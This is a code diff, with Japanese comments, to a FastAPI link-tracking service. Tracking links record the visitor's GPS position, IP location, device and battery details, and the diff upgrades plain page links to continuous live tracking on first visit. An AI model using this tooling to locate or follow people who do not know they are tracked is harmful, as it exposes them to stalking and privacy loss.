@@ -14,7 +14,7 @@ import os, json, random, string, datetime as dt
 from fastapi import APIRouter, Request, Depends, Form, HTTPException
 from fastapi.responses import HTMLResponse, RedirectResponse, PlainTextResponse
 
-from . import users, persist, linktrack
+from . import users, persist, linktrack, tenancy
 from .tenancy import db
 
 router = APIRouter()
@@ -22,6 +22,9 @@ router = APIRouter()
 LIVE_IV_MIN, LIVE_IV_MAX = 5, 600
 TRACK_KEEP = int(os.getenv("TRACK_KEEP", "20000"))
 LIVE_MAX_MIN = int(os.getenv("LIVE_MAX_MIN", "180"))
+# 旧版は「リアルタイム追跡」を選んでも page として保存されていた。
+# その救済として、page のリンクは初回アクセスで live に昇格させる。
+PROMOTE_PAGE = os.getenv("PROMOTE_PAGE_TO_LIVE", "1") != "0"
 
 
 def _m():
@@ -37,16 +40,25 @@ async def auth(request: Request):
     return await _m().auth(request)
 
 
-def _bind_owner(code):
-    return _m()._bind_owner(code)
-
-
 def _record_hit(request, code):
     return _m()._record_hit(request, code)
 
 
 def _now():
     return _m().now_iso()
+
+
+def _bind_owner(code):
+    """code から所有者を引き、テナント文脈を張る。"""
+    owner = users.owner_of_link(code)
+    if not owner:
+        return None
+    tenancy.set_current(owner)
+    try:
+        persist.touch(owner, interval=persist.cfg()["every_hit"])
+    except Exception:
+        pass
+    return owner
 
 
 # ---------- 小物 ----------
@@ -70,6 +82,14 @@ def _recent(ts, sec):
         return False
 
 
+def _clamp_iv(v):
+    try:
+        v = int(v or 15)
+    except Exception:
+        v = 15
+    return max(LIVE_IV_MIN, min(v, LIVE_IV_MAX))
+
+
 def _new_code(n=8):
     a = string.ascii_lowercase + string.digits
     for _ in range(60):
@@ -79,7 +99,23 @@ def _new_code(n=8):
     return "".join(random.choice(a) for _ in range(n + 4))
 
 
-def _tp_row(code, link, ip, p, g, q, kind="pt", sid=""):
+def _get_track(code):
+    """追跡として使えるリンクを返す。
+
+    live/snap はそのまま。page として保存されてしまったリンクは
+    ここで live に昇格させて救済する。
+    """
+    link = db.track_get(code)
+    if link:
+        return link
+    l = db.link_get(code)
+    if l and (l["mode"] or "page") == "page" and PROMOTE_PAGE:
+        db.track_update(code, mode="live", interval=_clamp_iv(l["interval"]))
+        return db.track_get(code)
+    return l
+
+
+def _tp_row(code, link, ip, p, g, q, kind="pt", sid="", note=""):
     """track_points 1行分。GPSが無ければIPの推定座標を入れる。"""
     lat = _f(q.get("lat") if q.get("lat") is not None else q.get("gps_lat"))
     lon = _f(q.get("lon") if q.get("lon") is not None else q.get("gps_lon"))
@@ -113,8 +149,14 @@ def _tp_row(code, link, ip, p, g, q, kind="pt", sid=""):
         "device": p.get("device"), "os": p.get("os"), "browser": p.get("browser"),
         "inapp": p.get("inapp"), "battery": _f(q.get("batt")),
         "charging": None if chg is None else (1 if chg else 0),
-        "screen": str(q.get("scr") or "")[:40], "note": "",
+        "screen": str(q.get("scr") or "")[:40], "note": (note or "")[:40],
     }
+
+
+def _live_page(request, code, hid, link, nonce):
+    return render("link_live.html", request, code=code, hit_id=hid, link=link,
+                  dest=link["dest"] or "", nonce=nonce,
+                  iv=_clamp_iv(link["interval"]), maxmin=LIVE_MAX_MIN)
 
 
 # ================= 公開ルート（/l/ 配下を引き継ぐ） =================
@@ -129,28 +171,31 @@ def link_hit(code: str, request: Request):
     hid = _record_hit(request, code)
     hrow = db.q1("SELECT nonce FROM link_hits WHERE id=?", (hid,))
     nonce = (hrow["nonce"] if hrow else "") or ""
+    mode = (link["mode"] or "page")
 
-    if link["mode"] == "redirect" and link["dest"]:
+    if mode == "redirect" and link["dest"]:
         return RedirectResponse(link["dest"], 302)
 
-    if link["mode"] == "quiz" and db.questions(code):
+    if mode == "quiz" and db.questions(code):
         qs = [{"id": r["id"], "qtype": r["qtype"], "prompt": r["prompt"],
                "options": json.loads(r["options"] or "[]")} for r in db.questions(code)]
         return render("link_quiz.html", request, code=code, hit_id=hid, link=link,
                       dest=link["dest"] or "", nonce=nonce,
                       questions_json=json.dumps(qs, ensure_ascii=False))
 
-    if link["mode"] == "identify":
+    if mode == "identify":
         ip = linktrack.client_ip(request)
         return render("link_identify.html", request, code=code, hit_id=hid, link=link,
                       dest=link["dest"] or "", nonce=nonce, ip=ip,
                       p=linktrack.parse_ua(request.headers.get("user-agent", "")),
                       g=linktrack.geo(ip))
 
-    if link["mode"] == "live":
-        return render("link_live.html", request, code=code, hit_id=hid, link=link,
-                      dest=link["dest"] or "", nonce=nonce,
-                      iv=int(link["interval"] or 15), maxmin=LIVE_MAX_MIN)
+    # 連続追跡モード（page のリンクは初回に live へ昇格）
+    if mode == "live" or (mode == "page" and PROMOTE_PAGE):
+        if mode != "live":
+            db.track_update(code, mode="live", interval=_clamp_iv(link["interval"]))
+            link = db.link_get(code) or link
+        return _live_page(request, code, hid, link, nonce)
 
     return render("link_land.html", request, code=code, hit_id=hid, link=link,
                   dest=link["dest"] or "", nonce=nonce)
@@ -163,6 +208,8 @@ async def link_extra(code: str, request: Request):
     try:
         body = await request.json()
     except Exception:
+        body = {}
+    if not isinstance(body, dict):
         body = {}
     hid = body.get("hit_id")
     if not hid:
@@ -209,8 +256,8 @@ async def link_extra(code: str, request: Request):
             pubkey=str(body.get("pubkey") or "")[:512])
 
     # 一瞬タイプのGPSを追跡履歴にも残す
-    link = db.link_get(code)
-    if link and link["mode"] in ("snap", "live") and body.get("gps_lat") is not None:
+    link = db.track_get(code)
+    if link and link["active"] and body.get("gps_lat") is not None:
         trow = _tp_row(code, link, ip, p, g, body, kind="snap", sid=vid)
         db.add_points(code, [trow])
         db.track_update(code, last_ts=trow["ts"], last_lat=trow["lat"],
@@ -225,7 +272,7 @@ async def link_point(code: str, request: Request):
     """ライブ追跡の座標受信。バッチ可。重複は捨てる。"""
     if not _bind_owner(code):
         return {"ok": 0, "why": "noowner"}
-    link = db.track_get(code)
+    link = _get_track(code)
     if not link or not link["active"]:
         return {"ok": 0, "why": "invalid"}
 
@@ -241,6 +288,7 @@ async def link_point(code: str, request: Request):
     g = linktrack.geo(ip)
 
     sid = str(body.get("sid") or "")[:40]
+    hid = str(body.get("hit") or "")[:20]
     kind = str(body.get("kind") or "pt")[:12]
     if kind not in ("pt", "open", "hb", "stop"):
         kind = "pt"
@@ -260,7 +308,7 @@ async def link_point(code: str, request: Request):
     for q in raw:
         if not isinstance(q, dict):
             continue
-        row = _tp_row(code, link, ip, p, g, q, kind="pt", sid=sid)
+        row = _tp_row(code, link, ip, p, g, q, kind="pt", sid=sid, note=hid)
         if row["lat"] is not None:
             key = (round(row["lat"], 5), round(row["lon"], 5))
             if key == pkey and row["ts"][:19] == (pts_ts or "")[:19]:
@@ -282,7 +330,7 @@ async def link_point(code: str, request: Request):
     if n and (int(link["points"] or 0) % 500) < n:
         db.prune_points(code, keep=TRACK_KEEP)
 
-    return {"ok": 1, "n": n, "iv": int(link["interval"] or 15), "server": _now()}
+    return {"ok": 1, "n": n, "iv": _clamp_iv(link["interval"]), "server": _now()}
 
 
 @router.get("/api/track/{code}")
@@ -290,13 +338,22 @@ def api_track(code: str, request: Request, since: int = 0, limit: int = 1500):
     """追跡画面がポーリングする公開JSON。code が実質のパスワード。"""
     if not _bind_owner(code):
         raise HTTPException(404, "noowner")
-    link = db.track_get(code)
+    link = _get_track(code)
     if not link:
         raise HTTPException(404, "notrack")
-    rows = db.points(code, since=int(since), limit=min(max(int(limit), 1), 5000))
-    iv = int(link["interval"] or 15)
+    try:
+        since = int(since)
+    except Exception:
+        since = 0
+    try:
+        limit = min(max(int(limit), 1), 5000)
+    except Exception:
+        limit = 1500
+    rows = db.points(code, since=since, limit=limit)
+    iv = _clamp_iv(link["interval"])
     return {
-        "person": link["person"] or link["name"], "mode": link["mode"],
+        "person": link["person"] or link["name"], "name": link["name"],
+        "dest": link["dest"] or "", "mode": link["mode"],
         "active": bool(link["active"]), "interval": iv,
         "live": bool(link["live"]) and _recent(link["last_ts"], max(90, iv * 4)),
         "last": {"ts": link["last_ts"], "lat": link["last_lat"], "lon": link["last_lon"],
@@ -337,13 +394,8 @@ def tracks_add(request: Request, person: str = Form(""), mode: str = Form("snap"
                u=Depends(auth)):
     person = (person or "").strip()[:40] or "名無し"
     mode = mode if mode in ("snap", "live") else "snap"
-    try:
-        interval = int(interval or 15)
-    except Exception:
-        interval = 15
-    interval = max(LIVE_IV_MIN, min(interval, LIVE_IV_MAX))
     code = _new_code()
-    db.add_track(code, person, mode=mode, interval=interval,
+    db.add_track(code, person, mode=mode, interval=_clamp_iv(interval),
                  dest=(dest or "").strip(), note=(note or "").strip()[:200])
     try:
         users.register_link(code, u)
@@ -382,7 +434,7 @@ def track_update_route(request: Request, code: str, person: str = Form(""),
     if mode in ("snap", "live"):
         f["mode"] = mode
     if interval:
-        f["interval"] = max(LIVE_IV_MIN, min(int(interval), LIVE_IV_MAX))
+        f["interval"] = _clamp_iv(interval)
     f["note"] = (note or "").strip()[:200]
     if active in ("0", "1"):
         f["active"] = int(active)
@@ -399,4 +451,8 @@ def track_clear(request: Request, code: str, u=Depends(auth)):
 @router.post("/track/{code}/delete")
 def track_delete(request: Request, code: str, u=Depends(auth)):
     db.del_track(code)
+    try:
+        users.unregister_link(code)
+    except Exception:
+        pass
     return RedirectResponse("/tracks", status_code=303)
